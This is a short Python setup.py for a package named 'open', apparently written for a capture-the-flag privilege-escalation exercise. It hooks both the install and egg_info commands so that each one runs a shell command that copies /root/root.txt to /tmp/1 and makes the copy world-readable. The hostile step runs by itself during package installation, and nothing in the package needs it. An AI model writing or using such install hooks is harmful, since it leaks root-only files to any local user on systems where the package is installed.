from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def a():
    os.system('cp /root/root.txt /tmp/1 ; chmod 777 /tmp/1')

class RunEggInfoCommand(egg_info):
    def run(self):
        a()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        a()
        install.run(self)

setup(
    name = "open",
    version = "1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
